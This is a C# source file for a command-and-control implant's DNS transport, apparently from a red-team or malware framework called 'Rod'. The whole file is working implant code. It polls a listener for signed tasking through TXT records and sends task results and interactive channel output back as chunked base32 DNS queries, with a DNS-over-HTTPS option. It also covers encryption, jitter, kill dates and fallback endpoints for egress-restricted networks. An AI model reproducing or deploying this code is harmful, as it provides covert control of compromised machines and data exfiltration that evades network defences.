using System.Net;
using System.Net.Sockets;
using System.Text;
using Google.Protobuf;
using Rod.V1;

namespace Rod.Implant.Internal;

// The DNS contact module (architecture.md Sec 8, the contract documented
// for implant authors in extending/implants.md): the egress-restricted
// carrier, one TXT query per contact under the listener's zone. No
// handshake and no mTLS ride DNS -- the implant is identified by its id
// alone, the session another transport opened is refreshed, and every
// tasking answer is verified like a stream-delivered one before anything
// runs. The beacon URL names the dial and the zone:
//
//   dns://<resolver-host>[:<port>]/<zone>
//
// The resolver is the listener itself (v1 dials it directly; queries
// through recursive resolvers arrive with a system-resolver dialer). A
// poll is one query answered with zero or one TXT record whose strings
// concatenate to the base32 of a marshaled, signed TaskRequest; a result
// is reported as chunked queries (label-budget chunks, 0-origin, a
// terminal flag closing the reassembly server-side).
//
// Sealing (a build that baked an envelope key, the web posture's own rule):
// the poll names the key id (k. instead of p.), so the answer arrives as a
// raw R1 AES-GCM body under a DNS-purpose tag -- the resolver chain reads
// no tasking or input bytes in the clear; results and channel outputs seal
// whole before chunking, so their bytes cross as ciphertext too. A build
// with no key keeps the plaintext grammar end to end.

internal static class DnsContact
{
    public static IContactClient Create(ContactSetup setup) => new DnsBeacon(
        setup.Egress,
        setup.Enrollment.ImplantId,
        setup.Enrollment.CAs,
        setup.Config.Sleep,
        setup.Config.Jitter,
        setup.Config.HasKillDate ? setup.Config.KillDate : null,
        setup.Enroll,
        setup.Log,
        setup.Nonces,
        setup.Cadence,
        setup.Held,
        setup.Config.Transport);
}

/// <summary>
/// Runs the implant's contact lifecycle over the DNS carrier: poll on the
/// cadence, run the one short tasking a poll may carry, report its result
/// as chunked TXT queries. A datagram that never lands is a walk
/// advancement like any dead front; an empty answer is a quiet poll
/// (presence refreshed, nothing to run).
/// </summary>
internal sealed class DnsBeacon : IContactClient
{
    // The result-chunk budget: each chunk rides one base32 label, and a
    // DNS label caps at 63 bytes -- 30 plaintext bytes expand to 48
    // characters, leaving room for the grammar's fixed labels.
    private const int ChunkBytes = 30;

    // The DNS carriage's purpose tags, the teamserver's AesGcmEnvelope
    // contract verbatim: one per direction and shape, so one purpose's
    // ciphertext never validates as another's under the same key.
    private const string PollAnswerAad = "rod-dns-poll-v1";
    private const string ResultAad = "rod-dns-result-v1";
    private const string ChannelAad = "rod-dns-channel-v1";

    private readonly EgressEndpoints _egress;    private readonly string _implantId;
    private readonly IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> _cas;
    private readonly TimeSpan _sleep;
    private readonly TimeSpan _jitter;
    private readonly DateTimeOffset? _killDate;
    private readonly TextWriter _log;
    private readonly Cadence? _cadence;
    private readonly TaskNonceTracker _nonces;
    private readonly HeldTaskLedger _held;

    // The baked envelope key's halves, when the build sealed contacts: the
    // k-poll names the id, the answers and reports seal under the key.
    private readonly (byte[] KeyId, byte[] Key)? _seal;

    // The shared task-acceptance pipeline (fronting gate, verification,
    // dedup, staged/channel/inline shapes) over this client's per-run
    // state.
    private readonly BeaconTasking _tasking;

    // The store-and-forward channel carriage (PollChannels): the DNS
    // carrier's own -- input arrives on the polls' TXT answers, output
    // chunks up as c. queries, all at the poll cadence.
    private readonly PollChannels _poll;

    public DnsBeacon(
        EgressEndpoints egress,
        string implantId,
        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2> cas,
        TimeSpan sleep,
        TimeSpan jitter,
        DateTimeOffset? killDate,
        EnrollBundle? enroll,
        TextWriter log,
        TaskNonceTracker? nonces = null,
        Cadence? cadence = null,
        HeldTaskLedger? held = null,
        TransportProfile? transport = null)
    {
        _egress = egress;
        _implantId = implantId;
        _cas = cas;
        _sleep = sleep;
        _jitter = jitter;
        _killDate = killDate;
        _log = log;
        _cadence = cadence;
        _nonces = nonces ?? new TaskNonceTracker();
        _held = held ?? new HeldTaskLedger();
        _seal = transport is { SealsContacts: true }
            ? EnvelopeWire.ParseBakedKey(transport.EnvelopeKey)
            : null;
        _poll = new PollChannels(_held, log);
        _tasking = new BeaconTasking(
            _implantId, _cas, enroll?.Fronted, _nonces, _held,
            HandlerRegistry.Default(enroll, cadence, ExtensionRegistrations.Handlers), _log);
    }

    public bool Serves(string beaconUrl) => BeaconUrl.IsDns(beaconUrl);

    public async Task<ContactExit> RunAsync(CancellationToken cancellationToken)
    {
        try
        {
            return await RunCyclesAsync(cancellationToken);
        }
        finally
        {
            // The run is ending: the poll carriage's channels end with it.
            await _poll.DisposeAsync();
        }
    }

    private async Task<ContactExit> RunCyclesAsync(CancellationToken cancellationToken)
    {
        // Results whose delivery died with an earlier carrier ride this one
        // first (the dispatch strand): the server reassembles chunks and
        // records first-wins.
        await _tasking.ReplayUndeliveredAsync(WriteFrameAsync, cancellationToken);

        var consecutiveFailures = 0;
        while (!cancellationToken.IsCancellationRequested)
        {
            if (_killDate is { } killDate && DateTimeOffset.Now > killDate)
            {
                _log.WriteLine($"beacon kill date {killDate:O} reached; terminating");
                return ContactExit.Terminate;
            }
            if (!Serves(_egress.CurrentBeaconUrl))
                return ContactExit.SwitchTransport;

            var reached = false;
            try
            {
                reached = await RunOnceAsync(cancellationToken);
            }
            catch (OperationCanceledException)
            {
                throw;
            }
            catch (Exception ex)
            {
                _log.WriteLine($"dns contact failed: {ex.Message}");
            }

            if (reached)
                consecutiveFailures = 0;
            else
            {
                consecutiveFailures++;
                // The egress walk: a poll that never landed means the
                // resolver is not answering, so the next attempt dials the
                // next entry.
                var from = _egress.CurrentBeaconUrl;
                _egress.Advance();
                if (from != _egress.CurrentBeaconUrl)
                    _log.WriteLine($"dns endpoint {from} failed; walking to {_egress.CurrentBeaconUrl}");
            }
            try
            {
                var (sleep, jitter) = _cadence?.Current ?? (_sleep, _jitter);
                await ContactCadence.SleepWithJitterAsync(sleep, jitter, consecutiveFailures, cancellationToken);
            }
            catch (OperationCanceledException)
            {
                return ContactExit.Terminate;
            }
        }
        return ContactExit.Terminate;
    }

    // One poll cycle. True when the exchange landed (the resolver answered,
    // even with nothing to run); false when it never did. Throws on
    // malformed answers, which the caller counts with the unreachable
    // resolver -- a DNS carrier answering garbage is not a front to trust.
    private async Task<bool> RunOnceAsync(CancellationToken cancellationToken)
    {
        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
        // The sealed build polls k.-named (the key id in the name, so the
        // answer seals under it); a keyless build keeps the p. grammar.
        var pollName = _seal is { } seal
            ? DnsNames.SealedPollName(_implantId, new Guid(seal.KeyId), zone)
            : DnsNames.PollName(_implantId, zone);
        var answer = await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, pollName, _cas, cancellationToken);
        if (answer is null || answer.Length == 0)
        {
            await FlushPollBatchAsync(cancellationToken);
            return true; // a quiet poll: presence refreshed, no tasking
        }

        // A sealed answer opens before its kind byte is read (the R1 magic
        // leads, which no kind byte collides with); a plaintext answer from
        // a server that lost the key's payload record still carries its
        // kind byte directly -- the signature, not the seal, gates
        // execution, so the degraded answer runs the ordinary path.
        if (_seal is { } open && answer.Length >= 2 && answer[0] == (byte)'R' && answer[1] == (byte)'1')
        {
            answer = EnvelopeWire.TryOpenBody(answer, open.KeyId, open.Key, PollAnswerAad)
                ?? throw new FormatException("a sealed DNS poll answer did not verify under the baked key");
        }

        // The answer's kind byte names its frame: a task to run, or parked
        // channel input to route -- the input answer carries every frame
        // the drain collected, each length-prefixed (a typing burst and its
        // eof arrive together; one frame per poll would strand the tail of
        // a park the server already emptied).
        if (answer[0] == (byte)'i')
        {
            var offset = 1;
            while (offset < answer.Length)
            {
                var (length, consumed) = ReadVarint(answer, offset);
                offset += consumed;
                if (length > (ulong)(answer.Length - offset))
                    break; // a truncated tail: drop it, the retransmit re-sends
                var input = ChannelInput.Parser.ParseFrom(answer.AsSpan(offset, (int)length).ToArray());
                _log.WriteLine($"dns poll carried input: task {input.TaskId} {input.Data.Length}B eof={input.Eof}");
                _poll.RouteInput(new Frame
                {
                    Kind = FrameKind.ChannelInput,
                    Payload = ByteString.CopyFrom(input.ToByteArray()),
                });
                offset += (int)length;
            }
            await FlushPollBatchAsync(cancellationToken);
            return true;
        }
        if (answer[0] != (byte)'t')
        {
            await FlushPollBatchAsync(cancellationToken);
            return true; // an unknown kind: treated as a quiet poll
        }

        var task = TaskRequest.Parser.ParseFrom(answer.AsSpan(1).ToArray());
        _log.WriteLine($"dns poll carried task {task.TaskId} ({task.Verb})");
        await _tasking.AcceptAsync(
            task,
            WriteFrameAsync,
            RunStagedRefusedAsync,
            // The store-and-forward carriage: the channel handler runs in the
            // background, its output batching into the poll batch (flushed as
            // c. chunks below), its input arriving on later polls' answers.
            (started, handler) => _poll.StartChannel(started, handler),
            cancellationToken);
        await FlushPollBatchAsync(cancellationToken);
        return true;
    }

    // Flushes the store-and-forward batch the run accumulated -- channel
    // output frames chunk up as c. queries, final TaskResults as r. queries
    // (the QueueResult discipline already routes them into the batch). A
    // frame is delivered only when its n.-probe confirms the exact blob
    // landed server-side: a lost chunk drops the reassembly whole, and the
    // unconfirmed frame re-sends next cycle (first-wins recording makes the
    // re-send idempotent).
    private async Task FlushPollBatchAsync(CancellationToken cancellationToken)
    {
        var pending = _poll.SnapshotPending();
        var delivered = new List<Frame>();
        foreach (var frame in pending)
        {
            if (frame.Kind == FrameKind.ChannelOutput)
            {
                var output = ChannelOutput.Parser.ParseFrom(frame.Payload);
                var data = output.Data.ToByteArray();
                await ReportChannelAsync(output.TaskId, data, cancellationToken);
                if (await ConfirmedAsync(output.TaskId, data, cancellationToken))
                    delivered.Add(frame);
            }
            else if (frame.Kind == FrameKind.TaskResult)
            {
                var result = TaskResult.Parser.ParseFrom(frame.Payload);
                await ReportAsync(result.TaskId, result.Outcome, result.Output, cancellationToken);
                if (await ConfirmedAsync(result.TaskId, Encoding.UTF8.GetBytes(result.Output), cancellationToken))
                    delivered.Add(frame);
            }
            // Ack and demand frames have no DNS carriage: the server's poll
            // path keeps no ack ledger and answers demands on the stream
            // carriers -- neither applies here.
        }
        _poll.MarkDelivered(delivered);
    }

    // One delivery probe (the retransmission half's confirmation): the
    // server answers y once this exact blob's reassembly reached recording.
    // A probe that never lands counts unconfirmed -- the next cycle's
    // re-send and re-probe settle it.
    private async Task<bool> ConfirmedAsync(
        string taskId, byte[] plaintext, CancellationToken cancellationToken)
    {
        if (!Guid.TryParse(taskId, out var task))
            return true; // no grammar to probe under: drop rather than spin
        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
        var name = DnsNames.ProbeName(_implantId, task, DnsNames.DeliverySha(plaintext), zone);
        var answer = await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, name, _cas, cancellationToken);
        return answer is { Length: 1 } && answer[0] == (byte)'y';
    }

    /// <summary>
    /// Reports one channel-output chunk sequence as c. queries under the
    /// current dial's zone: the marshaled ChannelOutput message chunks
    /// 0-origin with a terminal flag, mirroring the result path's shape.
    /// </summary>
    private async Task ReportChannelAsync(
        string taskId, byte[] data, CancellationToken cancellationToken)
    {
        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
        // The sealed build wraps the whole payload once (the overhead is
        // per-blob, not per-chunk), then chunks the ciphertext.
        if (_seal is { } seal)
            data = EnvelopeWire.SealBody(data, seal.KeyId, seal.Key, ChannelAad);
        var chunks = (data.Length + ChunkBytes - 1) / ChunkBytes;
        for (var index = 0; index < Math.Max(chunks, 1); index++)
        {
            var take = Math.Min(ChunkBytes, data.Length - index * ChunkBytes);
            var chunk = new byte[Math.Max(take, 0)];
            if (take > 0)
                Array.Copy(data, index * ChunkBytes, chunk, 0, take);
            var terminal = index == Math.Max(chunks, 1) - 1;
            var name = DnsNames.ChannelName(_implantId, taskId, index, terminal, chunk, zone);
            await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, name, _cas, cancellationToken, queryOnly: true);
        }
        _log.WriteLine($"dns channel output reported: task {taskId} {data.Length}B in {Math.Max(chunks, 1)} chunk(s)");
    }

    // Staged transfers ride a stream carrier's channel machinery; the DNS
    // budget carries short tasking only, so the demand is refused on the
    // task itself (the server's claim gate holds oversized tasking off this
    // carrier; this is the client-side belt for anything that slips).
    private static Task<(TaskOutcome Outcome, string Output)> RunStagedRefusedAsync(
        TaskRequest staged, CancellationToken cancellationToken) =>
        Task.FromResult((
            TaskOutcome.Failed,
            $"{staged.Verb} rides a stream transport; the DNS carrier carries short tasking only"));

    // Reads one LEB128 varint off the buffer: the value and its byte width.
    private static (ulong Value, int Bytes) ReadVarint(byte[] source, int offset)
    {
        ulong value = 0;
        var shift = 0;
        for (var consumed = 0; consumed < 5 && offset + consumed < source.Length; consumed++)
        {
            var b = source[offset + consumed];
            value |= (ulong)(b & 0x7f) << shift;
            if ((b & 0x80) == 0)
                return (value, consumed + 1);
            shift += 7;
        }
        return (0, 0);
    }

    // The write adapter: results ride as chunked TXT queries (idempotent
    // server-side, retransmission-safe by the first-wins record).
    private async Task WriteFrameAsync(Frame frame, CancellationToken cancellationToken)
    {
        if (frame.Kind != FrameKind.TaskResult)
            return;
        var result = TaskResult.Parser.ParseFrom(frame.Payload);
        await ReportAsync(result.TaskId, result.Outcome, result.Output, cancellationToken);
    }

    /// <summary>
    /// Reports one task's outcome as chunked result queries under the
    /// current dial's zone, 0-origin with a terminal flag; an empty output
    /// rides as a single empty terminal chunk.
    /// </summary>
    public async Task ReportAsync(
        string taskId, TaskOutcome outcome, string output, CancellationToken cancellationToken)
    {
        var (_, _, zone, _) = DnsDial.Parse(_egress.CurrentBeaconUrl);
        var bytes = Encoding.UTF8.GetBytes(output);
        // The sealed build wraps the whole output once, then chunks the
        // ciphertext -- the outcome flag stays in the name, where it rides
        // either way.
        if (_seal is { } seal)
            bytes = EnvelopeWire.SealBody(bytes, seal.KeyId, seal.Key, ResultAad);
        var succeeded = outcome == TaskOutcome.Succeeded;
        var chunks = (bytes.Length + ChunkBytes - 1) / ChunkBytes;
        for (var index = 0; index < Math.Max(chunks, 1); index++)
        {
            var take = Math.Min(ChunkBytes, bytes.Length - index * ChunkBytes);
            var chunk = new byte[Math.Max(take, 0)];
            if (take > 0)
                Array.Copy(bytes, index * ChunkBytes, chunk, 0, take);
            var terminal = index == Math.Max(chunks, 1) - 1;
            var name = DnsNames.ResultName(_implantId, taskId, succeeded, index, terminal, chunk, zone);
            await DnsDial.QueryAsync(_egress.CurrentBeaconUrl, name, _cas, cancellationToken, queryOnly: true);
        }
        _log.WriteLine($"dns result reported: task {taskId} in {Math.Max(chunks, 1)} chunk(s)");
    }
}

/// <summary>
/// The DNS dial and wire codec (RFC 1035's minimal TXT subset): one
/// question with an EDNS0 OPT record, answers parsed with compression
/// support, TXT strings concatenated back into one payload. The dial's
/// two carriages (extending/implants.md): raw UDP to the named resolver,
/// or RFC 8484 HTTPS -- the wire message riding a POST body to /dns-query
/// with the enrolled CA chain as the TLS trust anchor.
/// </summary>
internal static class DnsDial
{
    public static (string? Host, int Port, string Zone, bool DoH) Parse(string beaconUrl)
    {
        var trimmed = beaconUrl.Trim();
        var doh = trimmed.StartsWith("doh://", StringComparison.OrdinalIgnoreCase);
        var rest = trimmed[(doh ? "doh://" : "dns://").Length..];
        var slash = rest.IndexOf('/');

        // dns://zone (no authority): the system's own resolver -- the
        // queries ride whatever DNS server the host is configured to use,
        // the production shape for a delegated zone. DoH names its
        // resolver: the carriage is an HTTPS URL the host does not carry.
        if (slash < 0 && !doh)
            return (null, 53, rest.TrimEnd('.').ToLowerInvariant(), DoH: false);
        if (slash <= 0 || slash == rest.Length - 1)
            throw new NotSupportedException(
                $"A {(doh ? "doh" : "dns")}:// beacon URL names a resolver and a zone ({(doh ? "doh" : "dns")}://resolver[:port]/zone) or a bare zone (dns://zone), got '{beaconUrl}'.");
        var authority = rest[..slash];
        var zone = rest[(slash + 1)..].TrimEnd('.').ToLowerInvariant();
        if (zone.Length == 0)
            throw new NotSupportedException($"A dns/doh beacon URL names a zone, got '{beaconUrl}'.");

        int port = doh ? 443 : 53;
        string host;
        if (authority.StartsWith('['))
        {
            var close = authority.IndexOf(']');
            if (close < 0)
                throw new NotSupportedException($"Malformed resolver address '{authority}'.");
            host = authority[1..close];
            if (close + 2 <= authority.Length && authority[close + 1] == ':')
            {
                if (!int.TryParse(authority[(close + 2)..], out port))
                    throw new NotSupportedException($"Malformed resolver port in '{authority}'.");
            }
        }
        else
        {
            var colon = authority.LastIndexOf(':');
            if (colon >= 0)
            {
                host = authority[..colon];
                if (!int.TryParse(authority[(colon + 1)..], out port))
                    throw new NotSupportedException($"Malformed resolver port in '{authority}'.");
            }
            else
            {
                host = authority;
            }
        }
        return (host, port, zone, doh);
    }

    /// <summary>
    /// One TXT exchange over whichever carriage the beacon URL names. A
    /// null-host dns:// dial rides the system's resolver. Returns the
    /// concatenated payload bytes of the first TXT answer, or null when
    /// the answer carries none (a quiet poll).
    /// </summary>
    public static async Task<byte[]?> QueryAsync(
        string beaconUrl,
        string name,
        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2>? pinnedCas,
        CancellationToken cancellationToken,
        bool queryOnly = false)
    {
        var (host, port, _, doh) = Parse(beaconUrl);
        var query = EncodeQuery(name);
        byte[] datagram;
        if (doh)
        {
            if (host is null)
                throw new NotSupportedException("A doh:// beacon URL names its resolver; the system resolver is the UDP carriage's.");
            datagram = await PostWireAsync(host, port, query, pinnedCas, cancellationToken);
        }
        else
        {
            var (resolverHost, resolverPort) = host is null ? SystemResolver() : (host, port);
            datagram = await UdpExchangeAsync(resolverHost, resolverPort, query, cancellationToken);
        }
        return ParseAnswer(datagram, query, queryOnly);
    }

    /// <summary>
    /// The host's configured resolver (the production dial for a delegated
    /// zone): the first non-loopback DNS address the interfaces report,
    /// falling back to the loopback resolver when nothing else exists.
    /// </summary>
    public static (string Host, int Port) SystemResolver()
    {
        foreach (var nic in System.Net.NetworkInformation.NetworkInterface.GetAllNetworkInterfaces())
        {
            if (nic.OperationalStatus != System.Net.NetworkInformation.OperationalStatus.Up)
                continue;
            foreach (var dns in nic.GetIPProperties().DnsAddresses)
            {
                if (System.Net.IPAddress.IsLoopback(dns))
                    continue;
                return (dns.ToString(), 53);
            }
        }
        return ("127.0.0.1", 53);
    }

    // RFC 8484: one POST, application/dns-message, the wire query as the
    // body, the wire answer as the response body. TLS anchors to the
    // enrolled CA chain -- the same pin the web fronts use, so a lab cert
    // chains exactly like a production one.
    private static async Task<byte[]> PostWireAsync(
        string host,
        int port,
        byte[] query,
        IReadOnlyList<System.Security.Cryptography.X509Certificates.X509Certificate2>? pinnedCas,
        CancellationToken cancellationToken)
    {
        using var handler = new HttpClientHandler
        {
            ServerCertificateCustomValidationCallback = (_, certificate, chain, _) =>
            {
                if (certificate is null || chain is null)
                    return false;
                chain.ChainPolicy.TrustMode = System.Security.Cryptography.X509Certificates.X509ChainTrustMode.CustomRootTrust;
                foreach (var ca in pinnedCas ?? Array.Empty<System.Security.Cryptography.X509Certificates.X509Certificate2>())
                    chain.ChainPolicy.CustomTrustStore.Add(ca);
                return chain.Build(certificate);
            },
        };
        using var http = new HttpClient(handler) { Timeout = ExchangeTimeout };
        using var content = new ByteArrayContent(query);
        content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/dns-message");
        using var response = await http.PostAsync($"https://{host}:{port}/dns-query", content, cancellationToken);
        if (!response.IsSuccessStatusCode)
            throw new HttpRequestException($"the DoH carriage answered {response.StatusCode}");
        return await response.Content.ReadAsByteArrayAsync(cancellationToken);
    }

    private static async Task<byte[]> UdpExchangeAsync(
        string host, int port, byte[] query, CancellationToken cancellationToken)
    {
        using var udp = new UdpClient();
        await udp.SendAsync(query, query.Length, host, port);

        using var wait = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken);
        wait.CancelAfter(ExchangeTimeout);
        UdpReceiveResult datagram;
        try
        {
            datagram = await udp.ReceiveAsync(wait.Token);
        }
        catch (OperationCanceledException) when (!cancellationToken.IsCancellationRequested)
        {
            throw new TimeoutException($"the resolver {host}:{port} did not answer within {ExchangeTimeout.TotalSeconds:0}s");
        }
        return datagram.Buffer;
    }

    private static readonly TimeSpan ExchangeTimeout = TimeSpan.FromSeconds(5);

    private static byte[] EncodeQuery(string name)
    {
        var buffer = new List<byte>(64);
        var id = Random.Shared.Next(0x0001, 0xFFFF);
        buffer.Add((byte)(id >> 8));
        buffer.Add((byte)id);
        WriteU16(buffer, 0x0100); // query, recursion desired
        WriteU16(buffer, 1); // one question
        WriteU16(buffer, 0);
        WriteU16(buffer, 0);
        WriteU16(buffer, 1); // one additional: the OPT record
        WriteName(buffer, name);
        WriteU16(buffer, 16); // TXT
        WriteU16(buffer, 1); // IN
        // The OPT record (EDNS0): root name, type 41, CLASS = the payload
        // budget this client accepts.
        buffer.Add(0);
        WriteU16(buffer, 41);
        WriteU16(buffer, 1232);
        WriteU32(buffer, 0);
        WriteU16(buffer, 0);
        return buffer.ToArray();
    }

    private static byte[]? ParseAnswer(byte[] datagram, byte[] query, bool queryOnly)
    {
        if (datagram.Length < 12)
            throw new FormatException("a truncated DNS answer");
        var id = (datagram[0] << 8) | datagram[1];
        var queryId = (query[0] << 8) | query[1];
        if (id != queryId)
            throw new FormatException("a DNS answer with a mismatched id");
        var flags = (ushort)((datagram[2] << 8) | datagram[3]);
        if ((flags & 0x8000) == 0)
            throw new FormatException("a DNS datagram without the response bit");
        var rcode = flags & 0x000F;
        if (rcode != 0)
            throw new FormatException($"the resolver answered rcode {rcode}");

        var qdcount = (ushort)((datagram[4] << 8) | datagram[5]);
        var ancount = (ushort)((datagram[6] << 8) | datagram[7]);
        var arcount = (ushort)((datagram[10] << 8) | datagram[11]);

        var offset = 12;
        for (var question = 0; question < qdcount; question++)
        {
            if (!TrySkipName(datagram, ref offset))
                throw new FormatException("a malformed question in the DNS answer");
            offset += 4;
        }

        // The first TXT answer is the payload; the rest (and the OPT
        // record in the additional section) are ignored.
        for (var answer = 0; answer < ancount; answer++)
        {
            if (!TrySkipName(datagram, ref offset) || offset + 10 > datagram.Length)
                throw new FormatException("a malformed answer in the DNS answer");
            var type = (ushort)((datagram[offset] << 8) | datagram[offset + 1]);
            var rdlength = (ushort)((datagram[offset + 8] << 8) | datagram[offset + 9]);
            offset += 10;
            if (offset + rdlength > datagram.Length)
                throw new FormatException("a truncated answer record");
            if (type == 16 && !queryOnly)
            {
                var payload = new StringBuilder();
                var cursor = offset;
                var end = offset + rdlength;
                while (cursor < end)
                {
                    var length = datagram[cursor++];
                    if (cursor + length > end)
                        throw new FormatException("a TXT string overruns its record");
                    payload.Append(Encoding.ASCII.GetString(datagram, cursor, length));
                    cursor += length;
                }
                return DnsNames.Decode(payload.ToString())
                    ?? throw new FormatException("the TXT payload is not the base32 this protocol carries");
            }
            offset += rdlength;
        }
        _ = arcount;
        return null;
    }

    private static bool TrySkipName(byte[] datagram, ref int offset)
    {
        var jumps = 0;
        var cursor = offset;
        var nextAfterPointer = -1;
        while (true)
        {
            if (cursor >= datagram.Length)
                return false;
            var length = datagram[cursor];
            if (length == 0)
            {
                cursor++;
                break;
            }
            if ((length & 0xC0) == 0xC0)
            {
                if (cursor + 1 >= datagram.Length || ++jumps > datagram.Length)
                    return false;
                if (nextAfterPointer < 0)
                    nextAfterPointer = cursor + 2;
                cursor = ((length & 0x3F) << 8) | datagram[cursor + 1];
                continue;
            }
            cursor += 1 + length;
        }
        offset = nextAfterPointer >= 0 ? nextAfterPointer : cursor;
        return true;
    }

    private static void WriteName(List<byte> buffer, string name)
    {
        foreach (var label in name.Split('.'))
        {
            if (label.Length == 0 || label.Length > 63)
                throw new FormatException($"DNS label '{label}' is empty or over the 63-byte limit.");
            buffer.Add((byte)label.Length);
            buffer.AddRange(Encoding.ASCII.GetBytes(label));
        }
        buffer.Add(0);
    }

    private static void WriteU16(List<byte> buffer, ushort value)
    {
        buffer.Add((byte)(value >> 8));
        buffer.Add((byte)value);
    }

    private static void WriteU32(List<byte> buffer, uint value)
    {
        buffer.Add((byte)(value >> 24));
        buffer.Add((byte)(value >> 16));
        buffer.Add((byte)(value >> 8));
        buffer.Add((byte)value);
    }
}

/// <summary>
/// The contact name grammar (extending/implants.md): lowercase RFC 4648
/// base32 labels, no padding. The implant-side twin of the listener's
/// parser -- the wire-shape test keeps the pair in lockstep.
/// </summary>
internal static class DnsNames
{
    public static string PollName(string implantId, string zone)
        => $"p.{Encode(implantId)}.{zone}";

    /// <summary>
    /// Renders a key-named poll (the sealed carriage): the key id rides as
    /// its raw 16 guid bytes, base32 like every label.
    /// </summary>
    public static string SealedPollName(string implantId, Guid keyId, string zone)
        => $"k.{Encode(implantId)}.{Encode(keyId.ToByteArray())}.{zone}";

    /// <summary>
    /// Renders an enrollment-upload chunk name (the implant-side twin of
    /// the teamserver's parser): e.&lt;stream&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.
    /// </summary>
    public static string EnrollName(byte[] stream, int sequence, bool terminal, byte[] chunk, string zone)
        => "e." + Encode(stream)
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + zone;

    /// <summary>Renders an enrollment-answer probe name.</summary>
    public static string EnrollAnswerName(byte[] token, int sequence, string zone)
        => "a." + Encode(token)
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + zone;

    public static string ResultName(
        string implantId, string taskId, bool succeeded, int sequence, bool terminal, byte[] chunk, string zone)
        => "r." + Encode(taskId)
            + "." + (succeeded ? "s" : "f")
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + Encode(implantId)
            + "." + zone;

    /// <summary>
    /// Renders a channel-output chunk name (the implant-side twin of the
    /// teamserver's parser):
    /// c.&lt;task&gt;.&lt;seq&gt;.&lt;t|m&gt;.&lt;chunk&gt;.&lt;implant&gt;.
    /// </summary>
    public static string ChannelName(
        string implantId, string taskId, int sequence, bool terminal, byte[] chunk, string zone)
        => "c." + Encode(taskId)
            + "." + sequence.ToString(System.Globalization.CultureInfo.InvariantCulture)
            + "." + (terminal ? "t" : "m")
            + "." + (chunk.Length == 0 ? "e" : Encode(chunk))
            + "." + Encode(implantId)
            + "." + zone;

    /// <summary>
    /// Renders a delivery probe name (the implant-side twin of the parser):
    /// n.&lt;task&gt;.&lt;sha128&gt;.&lt;implant&gt;.
    /// </summary>
    public static string ProbeName(string implantId, Guid taskId, byte[] sha, string zone)
        => "n." + Encode(taskId.ToString())
            + "." + Encode(sha)
            + "." + Encode(implantId)
            + "." + zone;

    /// <summary>
    /// The delivery probe's blob identity: the first 16 SHA-256 bytes over
    /// the report's plaintext, the teamserver's own computation verbatim.
    /// </summary>
    public static byte[] DeliverySha(byte[] plaintext)
        => System.Security.Cryptography.SHA256.HashData(plaintext)[..16];

    public static string Encode(byte[] bytes)
    {
        const string alphabet = "abcdefghijklmnopqrstuvwxyz234567";
        var sb = new StringBuilder((bytes.Length * 8 + 4) / 5);
        var bits = 0;
        var bitCount = 0;
        foreach (var b in bytes)
        {
            bits = (bits << 8) | b;
            bitCount += 8;
            while (bitCount >= 5)
            {
                bitCount -= 5;
                sb.Append(alphabet[(bits >> bitCount) & 0x1F]);
            }
        }
        if (bitCount > 0)
            sb.Append(alphabet[(bits << (5 - bitCount)) & 0x1F]);
        return sb.ToString();
    }

    public static string Encode(string text) => Encode(Encoding.UTF8.GetBytes(text));

    public static byte[]? Decode(string text)
    {
        var clean = text.TrimEnd('=').ToUpperInvariant();
        var bits = 0;
        var bitCount = 0;
        var bytes = new List<byte>(clean.Length * 5 / 8);
        foreach (var c in clean)
        {
            var value = c switch
            {
                >= 'A' and <= 'Z' => c - 'A',
                >= '2' and <= '7' => c - '2' + 26,
                _ => -1,
            };
            if (value < 0)
                return null;
            bits = (bits << 5) | value;
            bitCount += 5;
            if (bitCount >= 8)
            {
                bitCount -= 8;
                bytes.Add((byte)((bits >> bitCount) & 0xFF));
            }
        }
        return bytes.ToArray();
    }
}
